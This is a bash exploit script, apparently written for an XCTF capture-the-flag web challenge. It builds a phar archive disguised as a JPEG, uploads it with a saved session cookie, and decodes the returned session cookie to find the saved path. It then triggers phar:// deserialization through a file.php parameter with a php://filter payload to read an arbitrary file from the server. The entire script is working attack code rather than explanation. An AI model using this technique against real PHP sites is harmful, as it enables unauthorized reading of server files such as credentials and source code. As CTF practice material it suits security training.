#!/usr/bin/env bash
set -euo pipefail
TARGET_URL='http://oj-10-30-15-9-40055.adworld.xctf.org.cn'
COOKIE='/home/ubuntu/027.cookies'
TARGET_FILE="$1"
php -d phar.readonly=0 /home/ubuntu/build_027_phar_nested_generic.php "php://filter/convert.base64-encode/resource=$TARGET_FILE" /home/ubuntu/tmpread.jpg >/dev/null
curl -i -s -b "$COOKIE" -F 'file=@/home/ubuntu/tmpread.jpg;type=image/jpeg' "$TARGET_URL/upload.php" -o /home/ubuntu/tmpread_upload.txt
SAVE=$(python3.11 - <<'PY'
import re,base64,json
text=open('/home/ubuntu/tmpread_upload.txt','r',encoding='utf-8',errors='ignore').read()
m=re.search(r'Set-Cookie: session=([^\.]+)\.', text)
if not m:
    raise SystemExit('no session cookie')
data=m.group(1); pad='='*((4-len(data)%4)%4)
raw=base64.urlsafe_b64decode(data+pad).decode()
print(json.loads(raw)['flash']['message'].split(': ',1)[1])
PY
)
curl -s "$TARGET_URL/file.php?c=phar://$SAVE/test.txt" -o /home/ubuntu/tmpread_resp.txt
python3.11 - <<'PY'
import re,base64
text=open('/home/ubuntu/tmpread_resp.txt','r',encoding='utf-8',errors='ignore').read()
ms=re.findall(r'([A-Za-z0-9+/=]{80,})', text)
print(base64.b64decode(ms[-1]).decode('utf-8','ignore') if ms else text[:2000])
PY
